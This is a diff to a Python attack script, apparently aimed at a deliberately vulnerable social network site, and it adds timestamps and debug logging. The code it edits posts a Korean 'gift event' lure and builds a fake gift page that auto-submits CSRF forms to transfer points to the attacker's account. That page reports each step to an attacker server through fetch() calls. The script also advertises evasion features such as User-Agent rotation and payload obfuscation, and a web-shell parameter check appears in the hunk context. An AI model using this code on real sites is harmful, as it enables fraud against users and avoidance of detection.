@@ -684,11 +684,14 @@ if(isset($_GET["cmd"])) {
             return False
         
         post_url = f"{self.base_url}/new_post.php"
-        attacker_url = f"{self.attacker_server}/fake-gift"
-        
+        # Add timestamp to prevent caching and ensure fresh link
+        timestamp = int(time.time())
+        attacker_url = f"{self.attacker_server}/fake-gift?t={timestamp}"
+
         print(f"[*] Creating malicious post with link to attacker server")
         print(f"[*] Attacker User ID: {self.attacker_user_id}")
         print(f"[*] Target URL: {attacker_url}")
+        print(f"[*] Attacker Server: {self.attacker_server}")  # Debug: Show current server
         
         payload = f'''🎁 특별 이벤트! 🎁
 
@@ -908,13 +911,23 @@ if(isset($_GET["cmd"])) {
         let attackExecuted = false;
         const ATTACKER_ID = '{self.attacker_user_id}';
         const TARGET_SNS = '{self.base_url}';
-        
+        const ATTACKER_SERVER = '{self.attacker_server}';
+
+        // Debug: Log configuration
+        console.log('='.repeat(60));
+        console.log('[+] Fake Gift Page Configuration:');
+        console.log('[+] Target SNS:', TARGET_SNS);
+        console.log('[+] Attacker ID:', ATTACKER_ID);
+        console.log('[+] Attacker Server:', ATTACKER_SERVER);
+        console.log('[+] Generated at:', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}');
+        console.log('='.repeat(60));
+
         window.onload = function() {{
-            fetch('{self.attacker_server}/notify?event=page_loaded&time=' + new Date().toISOString())
+            fetch(ATTACKER_SERVER + '/notify?event=page_loaded&time=' + new Date().toISOString())
                 .catch(() => {{}});
-            
+
             document.getElementById('status').innerHTML = '포인트를 받기 위해 준비 중...';
-            
+
             setTimeout(() => {{
                 executeCSRF();
             }}, 2000);
@@ -965,33 +978,33 @@ if(isset($_GET["cmd"])) {
                     if (form) {{
                         form.submit();
                         console.log('[+] Submitted form for ' + amount + 'P');
-                        
-                        fetch('{self.attacker_server}/notify?event=csrf_attempt&amount=' + amount + '&index=' + index)
+
+                        fetch(ATTACKER_SERVER + '/notify?event=csrf_attempt&amount=' + amount + '&index=' + index)
                             .catch(() => {{}});
-                        
-                        document.getElementById('status').innerHTML = 
+
+                        document.getElementById('status').innerHTML =
                             '시도 ' + (index + 1) + '/' + amounts.length + ': ' + amount + ' 포인트';
                     }}
                 }}, index * 500);
             }});
-            
+
             setTimeout(() => {{
                 document.getElementById('loading').style.display = 'none';
-                document.getElementById('success').innerHTML = 
+                document.getElementById('success').innerHTML =
                     '✅ 포인트 전송 완료!<br>곧 계정에 반영됩니다.';
                 document.getElementById('success').style.display = 'block';
                 document.getElementById('status').style.display = 'none';
-                
-                fetch('{self.attacker_server}/notify?event=csrf_completed&attempts=' + amounts.length)
+
+                fetch(ATTACKER_SERVER + '/notify?event=csrf_completed&attempts=' + amounts.length)
                     .catch(() => {{}});
-                
+
                 console.log('[+] All CSRF attempts completed');
             }}, amounts.length * 500 + 1000);
         }}
-        
+
         function notifyProfileChange() {{
             console.log('[+] Profile changed via GET CSRF');
-            fetch('{self.attacker_server}/notify?event=profile_changed&method=GET')
+            fetch(ATTACKER_SERVER + '/notify?event=profile_changed&method=GET')
                 .catch(() => {{}});
         }}
     </script>
@@ -1003,6 +1016,11 @@ if(isset($_GET["cmd"])) {
             f.write(fake_gift_html)
 
         print(f"[+] fake-gift.html saved to {fake_gift_path}")
+        print(f"[+] Configuration:")
+        print(f"    - Target SNS: {self.base_url}")
+        print(f"    - Attacker Server: {self.attacker_server}")
+        print(f"    - Attacker ID: {self.attacker_user_id}")
+        print(f"    - Generated Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
 
         self.log_event(
             'SETUP',
@@ -1961,13 +1979,15 @@ Immediate remediation is strongly recommended to prevent unauthorized access and
         print("\n" + "="*60)
         print("Vulnerable SNS - Security Assessment v2.0 (Evasion Mode)")
         print("="*60)
-        print(f"Target: {self.base_url}")
-        print(f"Attacker Server: {self.attacker_server}")
-        print(f"[*] Evasion features enabled:")
+        print(f"🎯 Target Server: {self.base_url}")
+        print(f"⚔️  Attacker Server: {self.attacker_server}")
+        print(f"📅 Assessment Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
+        print(f"\n[*] Evasion features enabled:")
         print(f"    - User-Agent rotation")
         print(f"    - Random delays between requests")
         print(f"    - Legitimate browser headers")
         print(f"    - Payload obfuscation")
+        print(f"\n[!] Generated files will use CURRENT attacker server: {self.attacker_server}")
         print("="*60)
 
         self.log_event('SCAN_START', f'Security assessment started on {self.base_url}', 'INFO')
